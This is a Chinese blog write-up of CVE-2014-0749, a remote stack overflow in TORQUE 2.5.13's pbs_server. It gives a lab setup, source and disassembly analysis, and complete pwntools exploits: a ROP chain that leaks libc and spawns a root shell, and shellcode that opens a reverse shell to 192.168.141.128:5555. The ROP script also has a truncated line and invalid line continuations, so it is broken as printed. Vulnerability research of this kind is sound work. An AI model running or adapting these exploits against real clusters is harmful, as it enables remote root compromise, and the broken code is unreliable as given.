---
layout: post
title:  "torque-2.5.13栈溢出分析"
date:   2025-04-14 13:27:38 +0800
category: userspace
---
漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。
攻击者可以获取远程root shell

# 漏洞信息

漏洞编号：[cve-2014-0749](https://nvd.nist.gov/vuln/detail/CVE-2014-0749)， [EDB-33554](https://www.exploit-db.com/exploits/33554)

简介：漏洞位于pbs_server组件的tcp_gets函数。该函数从socket句柄读取TCP载荷，将获取的数据复制到栈上的时候没有进行数据检查造成栈溢出。

影响范围：2.5 ~ 2.5.13

效果：攻击者可以获取远程root shell

内存控制能力：

- 没有NULL截断，可随意写入
- 栈上面的内容可控，无添加
- 溢出长度可控
- 没有内容过滤

# 环境搭建

## torque软件介绍

torque是分布式计算管理软件，pbs_server接收来自用户的作业请求，把作业请求根据计算节点的负载情况进行分配，下发到计算节点运行。

pbs_server负责监控每个计算节点的工作状态，适当时候进行作业调度。

漏洞发生在pbs_server接收用户的作业请求的时候，对用户的网络输入没有做长度检查，直接复制到栈上面导致的栈溢出漏洞。

![torque-软件架构.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84.jpg)

## torque的编译与使用

```bash
$ cd torque-2.5.13

# 关闭保护，添加调试符号 #
$ ./configure CFLAGS="-fno-stack-protector -z execstack -no-pie -z norelro -g"
$ make
$ sudo make install

# 默认配置，执行torque.setup脚本，参数是普通用户的用户名 #
$ sudo ./torque.setup test 

# 拷贝启动脚本到/etc/init.d目录
$ sudo cp contrib/init.d/debian.pbs_server /etc/init.d/pbs_server
$ sudo update-rc.d pbs_server defaults

# 启动pbs_server服务
$ sudo /etc/init.d/pbs_server restart
```

## 实验环境搭建

### 看门狗编写

调试过程中pbs_server会被反复打崩，每次崩溃后需要自动重启。

看门狗的功能是每隔1秒检查一下pbs_server服务的15001端口是否开放，如检测不到15001端口说明服务崩溃，重启pbs_server服务。

```bash
#!/bin/bash

# 看门狗，监控pbs_server服务，确保挂掉后能够重启 
# 以sudo权限执行脚本
check_root(){
    cat /etc/shadow > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo "please run as root privilege"
        return 127
    else
        return 0
    fi
}

check_port(){
    netstat -ltnp | grep -q ":15001" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        return 0        # 15001端口开放
    else
        return 1        # 15001端口关闭
    fi
}

# 重启pbs_server服务
restart_pbs_server(){
    echo "$(date): 15001 shutdown, restarting pbs_server ..."
    /etc/init.d/pbs_server restart
    if [ $? -eq 0 ]; then
        echo "$(date): pbs_server restart success! "
    else
        echo "$(date): error pbs_server restart failed! "
    fi
}

# 主循环，每隔1秒检查一次
if ! check_root; then 
    exit 1
fi

while true; do
    if ! check_port; then
        restart_pbs_server
    fi
    sleep 1
done
```

### pwndbg启动脚本编写

在服务端需要用pwndbg附加进程的方式对pbs_server进行调试

提取pbs_server的进程号，再使用-p参数attach上去调试。

需要注意的是容器启动参数需要 --cap-add=SYS_PTRACE 权限，否则不能attach进程。

```bash
#!/bin/sh

pid=$(ps -ef | grep -w "pbs_server" | awk '{print $2}')
sudo pwndbg -p $pid --symbols="bin/pbs_server"
```

# 漏洞分析

## 漏洞函数定位

根据漏洞公告提供的栈回溯信息：

```bash

#0 0x0000003dd4a88b9a in memcpy () from /lib64/libc.so.6
#1 0x00007fa0008cb65b in tcp_gets (fd=11, str=0x7fff8dfce741 '3' <repeats 26 times>,
"Ab1Ab2Ab3",
ct=332) at ../Libifl/tcp_dis.c:567
#2 0x00007fa0008be994 in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,
count=333)
at ../Libdis/disrsi_.c:187
#3 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,
count=<value optimized out>) at ../Libdis/disrsi_.c:216
#4 0x00007fa0008bea1a in disrsi_ (stream=11, negate=0x7fff8dfce93c, value=0x7fff8dfce938,
count=<value optimized out>) at ../Libdis/disrsi_.c:216
#5 0x00007fa0008bdfab in disrfst (stream=11, achars=33, value=0x27f0b58 "")
at ../Libdis/disrfst.c:125
#6 0x00007fa0008c13ba in decode_DIS_ReqHdr (sock=11, preq=0x27f0b20,
proto_type=0x7fff8dfce9dc,
proto_ver=0x7fff8dfce9d8) at ../Libifl/dec_ReqHdr.c:141
#7 0x0000000000409ba1 in dis_request_read (sfds=11, request=0x27f0b20) at dis_read.c:137
#8 0x000000000041cb6e in process_request (sfds=11) at process_request.c:355
#9 0x00007fa0008d4899 in wait_request (waittime=<value optimized out>, SState=0x72c258)
at ../Libnet/net_server.c:508
#10 0x000000000041afeb in main_loop () at pbsd_main.c:1203
#11 0x000000000041bd15 in main (argc=<value optimized out>, argv=<value optimized out>)
at pbsd_main.c:1760

```

可以整理出如下函数调用过程：

![torque.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque.jpg)

画框的部分是递归，递归层数根据攻击者的输入而定。

## 漏洞原理

从socket句柄获取数据是从disrsi_函数开始的：

```c
int disrfst(int stream, size_t  achars, char *value){
  int  locret;
  int  negate;
  unsigned count;
  locret = disrsi_(stream, &negate, &count, 1);
```

用户的输入格式如下，使用ASCII编码的字符串来表示十进制数，前一级指示后一级数字的长度，递归调用disrsi_函数来解析。

![torque-payload.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-payload.jpg)

disrsi_ 函数的作用是递归解析用户输入，第一次调用 disrsi_ 的 count=1，表示读取第一个字节，就是上图的“3”，表示下一级的长度为3个字符，解析出来3传递给下一次递归调用的 count 参数；

第二次递归调用 disrsi_ 的 count 等于上一次解析出来的3，这次会读取“123”并转化成unsigned 传递给下一次递归的 count 参数；

第三次递归调用 disrsi_ 的 count 等于123，作为下一次递归调用的 count 参数。

第四次递归调用 disrsi_ 会认为后面的十进制数字的长度是123个字符，因此会从socket句柄读取123字节存放到 scratch 数组中，而该数组的长度为65字节，造成了溢出。

每一次递归都会重新分配 disrsi_ 函数栈帧，因此覆盖的返回地址是回到上一级 disrsi_ 函数的地址。

```c
int disrsi_(int stream, int *negate, unsigned *value, unsigned  count){
  int  c;
	unsigned locval;
  unsigned ndigs;
  char  *cp;
  char  scratch[DIS_BUFSIZ+1];     //被溢出的对象, 长度为65

  memset(scratch, 0, DIS_BUFSIZ+1);
  if (dis_umaxd == 0)
    disiui_();   //计算dis_umaxd的值
    
	// 函数指针调用，实际调用tcp_getc函数, 获取1字节tcp数据
	// 判断 正负号 以及用户输入是不是一个合法的十进制字符串
  switch (c = (*dis_getc)(stream)) 
  {
    case '-':
    case '+':
      *negate = c == '-';
      if ((*dis_gets)(stream, scratch, count) != (int)count){ //
        return(DIS_EOD);
      }

      if (count >= dis_umaxd){    // 经过调试，dis_umaxd=10
        if (count > dis_umaxd)    // 该变量的意义是unsigned int的最大值为0xffff_ffff
          goto overflow;          // 化为十进制就是4294967295，长度为10个字符
                                  // 意义就是unsigned int的最大数需要用10个数字来表示十进制值
        if (memcmp(scratch, dis_umax, dis_umaxd) > 0)
          goto overflow;
      }                           // 以上处理用户输入超过unsigned int表示范围的情况
      cp = scratch;
      locval = 0;

      do
        {
        if (((c = *cp++) < '0') || (c > '9'))
          {
          return(DIS_NONDIGIT);
          }

        locval = 10 * locval + c - '0';
        }
      while (--count);
      *value = locval;
      return (DIS_SUCCESS);

      break;
    case '0':     //第一个数字不能是0
      return (DIS_LEADZRO);
      break;
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      ndigs = c - '0';    //计算十进制字符串的长度

      if (count > 1){
      //tcp_gets
        if ((*dis_gets)(stream, scratch + 1, count - 1) != (int)count - 1){
          return(DIS_EOD);
        }
        
        cp = scratch;

        if (count >= dis_umaxd){
          if (count > dis_umaxd)
            break;

          *cp = c;

          if (memcmp(scratch, dis_umax, dis_umaxd) > 0)
            break;
        }

        while (--count){
          if (((c = *++cp) < '0') || (c > '9')){
            return(DIS_NONDIGIT);
          }

          ndigs = 10 * ndigs + c - '0';
        }
      }    /* END if (count > 1) */

 // 递归调用disrsi_
      return(disrsi_(stream, negate, value, ndigs));
      break;
      
    case - 1:
      return(DIS_EOD);
      break;
    case -2:
      return(DIS_EOF);
      break;
    default:
      return(DIS_NONDIGIT);
      break;
    }
  *negate = FALSE;

overflow:
	  *value = UINT_MAX;
	  return(DIS_OVERFLOW);
  }  

```

每一次的递归都会产生一个disrsi_函数栈，其中包含一个新的scratch数组。

```c
static int tcp_gets(int fd, char *str, size_t ct){
  int x;
  struct tcpdisbuf *tp;
  tp = &tcparray[fd]->readbuf;

  while (tp->tdis_eod - tp->tdis_leadp < (ssize_t)ct){
    x = tcp_read(fd);
    if (x <= 0){
      return(x);  /* Error or EOF */
    }
  }

// 漏洞点，把获取到的tcp数据拷贝到str数组，没有进行长度检查
// str指向父函数disrsi_中定义的 char  scratch[DIS_BUFSIZ+1]; 
// scratch数组长度为65字节
  memcpy((char *)str, tp->tdis_leadp, ct);

  tp->tdis_leadp += ct;

  return((int)ct);
}  /* END tcp_gets() */

```

scratch数组到rbp的距离为0x60，到返回地址距离为0x68：

```bash
.text:000000000000E134 ; =============== S U B R O U T I N E =======================================
.text:000000000000E134
.text:000000000000E134 ; Attributes: bp-based frame
.text:000000000000E134
.text:000000000000E134 ; int __cdecl disrsi_(int stream, int *negate, unsigned int *value, unsigned int count)
.text:000000000000E134 disrsi_         proc near          ; CODE XREF: _disrsi__localalias+4↑j
.text:000000000000E134                                    ; disrsi_+3B1↓p
.text:000000000000E134                                    ; DATA XREF: ...
.text:000000000000E134
.text:000000000000E134 value           = qword ptr -78h
.text:000000000000E134 negate          = qword ptr -70h
.text:000000000000E134 count           = dword ptr -68h
.text:000000000000E134 stream          = dword ptr -64h
.text:000000000000E134 scratch         = byte ptr -60h    ;scratch数组距离返回地址0x68字节
.text:000000000000E134 c               = dword ptr -14h
.text:000000000000E134 cp              = qword ptr -10h
.text:000000000000E134 ndigs           = dword ptr -8
.text:000000000000E134 locval          = dword ptr -4
.text:000000000000E134
.text:000000000000E134 ; __unwind {
.text:000000000000E134                 endbr64
.text:000000000000E138                 push    rbp
.text:000000000000E139                 mov     rbp, rsp
.text:000000000000E13C                 add     rsp, 0FFFFFFFFFFFFFF80h
.text:000000000000E140                 mov     [rbp+stream], edi
.text:000000000000E143                 mov     [rbp+negate], rsi
.text:000000000000E147                 mov     [rbp+value], rdx
.text:000000000000E14B                 mov     [rbp+count], ecx
.text:000000000000E14E                 cmp     [rbp+negate], 0
.text:000000000000E153                 jnz     short loc_E174
.text:000000000000E155                 lea     rcx, __PRETTY_FUNCTION___2322 
.text:000000000000E15C                 mov     edx, 68h
.text:000000000000E161                 lea     rsi, aLibdisDisrsiC
.text:000000000000E168                 lea     rdi, aNegateNull
.text:000000000000E16F                 call    ___assert_fail
.text:000000000000E174 ; ---------------------------------------------------------------------------
.text:000000000000E174
.text:000000000000E174 loc_E174:                               ; CODE XREF: disrsi_+1F↑j
.text:000000000000E174                 cmp     [rbp+value], 0
.text:000000000000E179                 jnz     short loc_E19A
.text:000000000000E17B                 lea     rcx, __PRETTY_FUNCTION___2322
.text:000000000000E182                 mov     edx, 69h
.text:000000000000E187                 lea     rsi, aLibdisDisrsiC
.text:000000000000E18E                 lea     rdi, aValueNull_1
.text:000000000000E195                 call    ___assert_fail
```

每次都是从scratch + 1的位置开始写入，所以实际的溢出长度为0x67（103）

```c
int disrsi_(int stream, int *negate, unsigned *value, unsigned  count){
  int  c;
  unsigned locval;
  unsigned ndigs;
  char  *cp;
  char  scratch[DIS_BUFSIZ+1];     //被溢出的对象, 长度为65

  memset(scratch, 0, DIS_BUFSIZ+1);
  if (dis_umaxd == 0)
    disiui_();   //计算dis_umaxd的值
    
	// 函数指针调用，实际调用tcp_getc函数, 获取1字节tcp数据
	// 判断 正负号 以及用户输入是不是一个合法的十进制字符串
  switch (c = (*dis_getc)(stream)) {
    case '-':
    case '+':
      *negate = c == '-';
      if ((*dis_gets)(stream, scratch, count) != (int)count){ //
        return(DIS_EOD);
      }

      if (count >= dis_umaxd){    // 经过调试，dis_umaxd=10
        if (count > dis_umaxd)    // 该变量的意义是unsigned int的最大值为0xffff_ffff
          goto overflow;          // 化为十进制就是4294967295，长度为10个字符
                                  // 意义就是unsigned int的最大数需要用10个数字来表示十进制值
        if (memcmp(scratch, dis_umax, dis_umaxd) > 0)
          goto overflow;
      }                           // 以上处理用户输入超过unsigned int表示范围的情况
      cp = scratch;
      locval = 0;

      do
        {
        if (((c = *cp++) < '0') || (c > '9'))
          {
          return(DIS_NONDIGIT);
          }

        locval = 10 * locval + c - '0';
        }
      while (--count);
      *value = locval;
      return (DIS_SUCCESS);

      break;
    case '0':     //第一个数字不能是0
      return (DIS_LEADZRO);
      break;
    case '1':
    case '2':
    case '3':
    case '4':
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      ndigs = c - '0';    //计算十进制字符串的长度

      if (count > 1){
      //每次都是从scratch + 1的位置开始写
        if ((*dis_gets)(stream, scratch + 1, count - 1) != (int)count - 1){
          return(DIS_EOD);
        
```

# 漏洞利用

## 发生栈溢出的现场

发现 disrsi_ 函数返回地址已经被覆盖为0xdeadbeefdeadbeef。

rdi寄存器指向我们输入的字符串“111111111”，因此可以考虑往栈上面写”/bin/sh”，这样后面rop的时候rdi指向的就直接是可执行文件的路径。

```bash
pwndbg> c 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f3e41963525 in disrsi_ () from /usr/local/lib/libtorque.so.2
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
__________________[ REGISTERS / show-flags off / show-compact-regs off ]________________
*RAX  1
 RBX  7
*RCX  0x7f3e416a9015 __ 0x3131313131313131 ('11111111')
*RDX  0x6f
*RDI  0x7ffda583cf41 __ 0x3131313131313131 ('11111111')   //注意到rdi指向我们的payload
*RSI  0x7f3e416a9015 __ 0x3131313131313131 ('11111111')
*R8   0x7f3e419734d4 (tcp_gets) __ endbr64 
*R9   0x7f3e41941b80 __ 0
*R10  0x7f3e41959a9d __ 'read_nonblocking_socket'
 R11  0x246
 R12  0x407e20 (_start) __ endbr64 
 R13  0x7ffda583e8a0 __ 1
 R14  0
 R15  0
*RBP  0x3131313131313131 ('11111111')
*RSP  0x7ffda583cfa8 __ 0xdeadbeefdeadbeef
*RIP  0x7f3e41963525 (disrsi_+1009) __ ret 
___________________________[ DISASM / x86-64 / set emulate on ]__________________________
 _ 0x7f3e41963525 <disrsi_+1009>    ret                   <0xdeadbeefdeadbeef>
    _

__________________________________________[ STACK ]______________________________________
00:0000_ rsp 0x7ffda583cfa8 __ 0xdeadbeefdeadbeef
01:0008_     0x7ffda583cfb0 __ 0
02:0010_     0x7ffda583cfb8 __ 0x7ffda583d0e4 __ 0xffffffff
03:0018_     0x7ffda583cfc0 __ 0x7ffda583d0e8 __ 0x7f3e00000000
04:0020_     0x7ffda583cfc8 __ 0xa00000000
05:0028_     0x7ffda583cfd0 __ 0x323100
06:0030_     0x7ffda583cfd8 __ 0
07:0038_     0x7ffda583cfe0 __ 0
___________________________________________[ BACKTRACE ]_________________________________
 _ 0   0x7f3e41963525 disrsi_+1009
   1 0xdeadbeefdeadbeef None
   2              0x0 None
_________________________________________
```

## payload构造和函数栈帧

### shellcode执行版本

其中payload部分长度为229字节，payload头部必须是非零十进制数；

“A” * 103 从 scratch + 1开始覆盖到返回地址；

返回地址覆盖为 jmp rsp 指令的地址；

shellcode的功能是反弹shell到远程主机的5555端口

![torque-shellcode payload.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-shellcode_payload.jpg)

![torque-shellcode函数栈帧.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-shellcode%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7.jpg)

### rop版本

p64(ret)用来把rsp进行16字节对齐

![torque-rop第一轮.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%B8%80%E8%BD%AE.jpg)

![torque-rop第二轮.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%BA%8C%E8%BD%AE.jpg)

第三轮交互到栈溢出的时候rdi寄存器指向scratch+1的位置，我们可以把“/bin/sh\x00”写在此处这样直接就能作为execv的第一个参数使用。

![torque-rop第三轮.jpg](/assets/posts/2025-04-14-torque-栈溢出分析/torque-rop%E7%AC%AC%E4%B8%89%E8%BD%AE.jpg)

## 利用代码

### rop版本（可绕NX）

rop版本的利用有3个关键点：

1. 需要把socket句柄重定向到stdin和stdout，这样才能在execv(”/bin/sh”)之后可以同pwntools和远程交互；
2. 需要泄露出libc基地址，由此计算dup2函数地址做输入输出重定向；
3. 需要在pbs_server的代码段找到一个可重入的地址，每次栈溢出执行rop之后可以返回到该地址，重新接收下一轮数据，进行下一轮栈溢出

以上这么设计的原因是需要多轮的栈溢出，需要多次和pbs_server交互而不能把它打崩溃。

经过搜索找到main_loop函数作为可重入地址。

该函数是pbs_server的主要逻辑，并且没有参数作为输入，唯一的要求就是，通过rop进入之前要保证rsp是16字节对齐。

```c
main(){
  ......
  add_conn(rppfd, Primary, (pbs_net_t)0, 0, PBS_SOCK_INET, rpp_request);
  add_conn(privfd, Primary, (pbs_net_t)0, 0, PBS_SOCK_INET, rpp_request);

  main_loop();
  ......
}
```

若进入main_loop之前rsp没有16字节对齐，会报段错误，出错的指令在sprintf函数里面：
“movaps xmmword ptr [rsp], xmm0”

- 这条指令的作用是：将 XMM0 寄存器的 128 位（16字节）数据移动到栈 [rsp] 中；
- 对齐要求：
    - movaps(**Move Aligned Packed Single-Precision**) 要求目标内存地址 **必须按 16 字节对齐**（即地址是 16 的倍数，如 0x7fffffffe000）
    - 若未对齐，会触发段错误异常（崩溃）
- 替代方法：
    - 确保 rsp 是 16 的倍数
    - 改用不要求对齐的 movups（但性能略低）

```bash
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f29deb78dcd in ?? () from /lib/x86_64-linux-gnu/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
_____________________[ REGISTERS / show-flags off / show-compact-regs off ]_______________________________________________________________
*RAX  0
*RBX  0xffffffffffffffff
*RCX  0
*RDX  0xffffffffffffffff
*RDI  0x7ffcd61949c8 __ 0xfbad8000
*RSI  0x538ba0 (log_buffer) __ 'Torque Server Version = 2.5.13, loglevel = 0'
*R8   0
*R9   0x7f29decd1b80 __ 0
*R10  0x7f29ded15028 __ 'Server Ready, pid = %d, loglevel=%d'
 R11  0x246
*R12  0x538ba0 (log_buffer) __ 'Torque Server Version = 2.5.13, loglevel = 0'
*R13  0x538ba0 (log_buffer) __ 'Torque Server Version = 2.5.13, loglevel = 0'
*R14  0x7ffcd61949c8 __ 0xfbad8000
*R15  0x7f29ded15028 __ 'Server Ready, pid = %d, loglevel=%d'
*RBP  0x7ffcd61949c8 __ 0xfbad8000
*RSP  0x7ffcd6194988 __ 0
*RIP  0x7f29deb78dcd __ movaps xmmword ptr [rsp], xmm0
_____________________[ DISASM / x86-64 / set emulate on ]________________________________________________________________________
 _ 0x7f29deb78dcd    movaps xmmword ptr [rsp], xmm0     <[0x7ffcd6194988] not aligned to 16 bytes>
   0x7f29deb78dd1    call   _IO_setb                    <_IO_setb>
 
   0x7f29deb78dd6    movdqa xmm0, xmmword ptr [rsp]
   0x7f29deb78ddb    mov    qword ptr [rbp + 8], r13
   0x7f29deb78ddf    movups xmmword ptr [rbp + 0x18], xmm0
   0x7f29deb78de3    test   r12, r12
   0x7f29deb78de6    je     0x7f29deb78e30              <0x7f29deb78e30>
 
   0x7f29deb78de8    movq   xmm0, r12
   0x7f29deb78ded    movq   xmm1, rbx
   0x7f29deb78df2    mov    qword ptr [rbp + 0x10], r12
   0x7f29deb78df6    punpcklqdq xmm0, xmm1
___________________________________[ STACK ]_____________________________________________________________________________________
00:0000_ rsp 0x7ffcd6194988 __ 0
01:0008_-038 0x7ffcd6194990 __ 0x7f29deb777bf __ mov dword ptr [rbp + 0xc0], r12d
02:0010_-030 0x7ffcd6194998 __ 0
03:0018_-028 0x7ffcd61949a0 __ 0x7ffcd6194b08 __ 0x3000000010
04:0020_-020 0x7ffcd61949a8 __ 0x538ba0 (log_buffer) __ 'Torque Server Version = 2.5.13, loglevel = 0'
05:0028_-018 0x7ffcd61949b0 __ 0xffffffffffffffff
06:0030_-010 0x7ffcd61949b8 __ 0
07:0038_-008 0x7ffcd61949c0 __ 0x7f29deb6a0e8 __ mov rdx, rbx
__________________________________[ BACKTRACE ]___________________________________________________________________________________
 _ 0   0x7f29deb78dcd None
   1   0x7f29deb6a0e8 None
   2   0x7f29deb46ec8 sprintf+168
   3         0x421418 main_loop+81
   4         0x422539 main+2468
_______________________________________________________________________________________________________
```

rop解决方式，可以绕过NX：

```python
#!/usr/bin/python

from pwn import *
from LibcSearcher import LibcSearcher

context.arch = 'amd64'
#context.log_level = 'debug'
context.os = 'linux'

rp = remote("172.17.0.2", 15001)

overflow_distance = 103     # 实际溢出长度为103
pop_rdi_ret = 0x41c83d
pop_rsi_ret = 0x4282b0
pop_rdx_ret = 0x4426c2
ret = 0x421A4F
jmp_rsp = 0x40900d
execv_plt = 0x407DA0
write_plt = 0x407850
got_snprintf = 0x46A4B0
main_loop = 0x422534

# 反弹shell到远程5555端口
'''
shellcode = asm(shellcraft.connect("192.168.141.128", 5555) + shellcraft.dupsh())
payload = b'/bin/sh\x00' + b'1' * (overflow_distance - 8) + \
            p64(jmp_rsp) + shellcode 
'''

# rop解决方式
payload = b'/bin/sh\x00' + b'1' * (overflow_distance - 8) + \
            p64(pop_rdi_ret) + \
            p64(10) + \             # socket句柄的fd=10
            p64(pop_rsi_ret) + \
            p64(got_snprintf) + \
            p64(pop_rdx_ret) + \
            p64(8) + \
            p64(write_plt) + \      # write(10, got_snprintf, 8) 泄露snprintf函数地址
            p64(ret) + \            # 让rsp 16字节对齐, 否则有些地方会段错误 ?????
            p64(main_loop)          # 返回到main_loop函数继续监听

packet = b'3' + str(len(payload) + 1).encode() + b'1' + payload
rp.sendline(packet)

snprintf_addr = u64(rp.recv(8).ljust(8, b'\x00'))  # 解析snprintf函数地址
print("snprintf addr: " + hex(snprintf_addr))

libc = LibcSearcher('snprintf', snprintf_ad
libc_base = snprintf_addr - libc.dump('snprintf')
print("libc base: " + hex(libc_base))              # 计算libc基地址

dup2_addr = libc_base + libc.dump('dup2')
print("dup2 addr: " + hex(dup2_addr))              # 计算dup2函数地址

payload = b'/bin/sh\x00' + b'1' * (overflow_distance - 8) + \
            p64(pop_rdi_ret) + \
            p64(10) + \
            p64(pop_rsi_ret) + \
            p64(0) + \
            p64(dup2_addr) + \       # dup2(10, 0), socket句柄重定向到stdin
            p64(pop_rdi_ret) + \
            p64(10) + \
            p64(pop_rsi_ret) + \
            p64(1) + \ 
            p64(dup2_addr) + \       # dup2(10, 1), socket句柄重定向到stdout
            p64(main_loop)           # 返回main_loop函数继续监听
packet = b'3' + str(len(payload) + 1).encode() + b'1' + payload
rp.sendline(packet)

payload = b'/bin/sh\x00' + b'1' * (overflow_distance - 8) + \
            p64(pop_rsi_ret) + \
            p64(0) + \
            p64(execv_plt)           # 执行execv("/bin/sh", NULL)获取远程shell
packet = b'3' + str(len(payload) + 1).encode() + b'1' + payload
rp.sendline(packet)

rp.interactive()
```

rop方式获取远程root shell：

![remote root shell.png](/assets/posts/2025-04-14-torque-栈溢出分析/remote_root_shell.png)

### shellcode版本（关闭NX）

shellcode解决方式，要关闭NX，效果是反弹shell到192.168.141.128主机的5555端口：

```python
#!/usr/bin/python

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

rp = remote("172.17.0.2", 15001)

overflow_distance = 103     # 实际溢出长度为103
jmp_rsp = 0x40900d

# 反弹shell到远程5555端口
shellcode = asm(shellcraft.connect("192.168.141.128", 5555) + shellcraft.dupsh())
payload = b'1' * overflow_distance + p64(jmp_rsp) + shellcode 

packet = b'3' + str(len(payload) + 1).encode() + b'1' + payload
rp.sendline(packet)
```

shellcode反弹shell：

![shellcode打成功.png](/assets/posts/2025-04-14-torque-栈溢出分析/shellcode%E6%89%93%E6%88%90%E5%8A%9F.png)

# 参考资料

OSS公告：

[Bugtraq: [CVE-2014-0749] TORQUE Buffer Overflow](https://seclists.org/bugtraq/2014/May/75)

torque的编译、安装、部署、使用

[Torque安装部署以及使用方法详解](https://www.jianghaizhi.com/bckf/1262.html)